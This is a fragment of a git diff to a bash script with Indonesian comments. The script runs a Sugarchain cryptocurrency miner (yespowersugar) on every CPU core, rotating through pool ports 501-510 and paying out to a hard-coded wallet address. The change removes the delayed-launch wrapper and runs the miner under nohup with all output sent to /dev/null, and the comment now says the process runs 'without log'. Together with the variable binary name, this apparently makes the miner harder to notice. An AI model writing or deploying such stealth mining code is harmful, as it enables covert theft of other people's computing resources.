@@ -58,10 +58,10 @@ while [ $(date +%s) -lt $end_time ]; do
     continue
   fi
 
-  # Rotasi port dan jalankan proses
+  # Rotasi port dan jalankan proses tanpa log
   for port in $(seq 501 510); do
     command="$dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --timeout 90 -t $(nproc)"
-    run_with_random_delay "$command &" 10 60
+    nohup $command > /dev/null 2>&1 &
     process_pid=$!
 
     echo "Menjalankan proses dengan PID $process_pid pada IP $ip dan port $port"
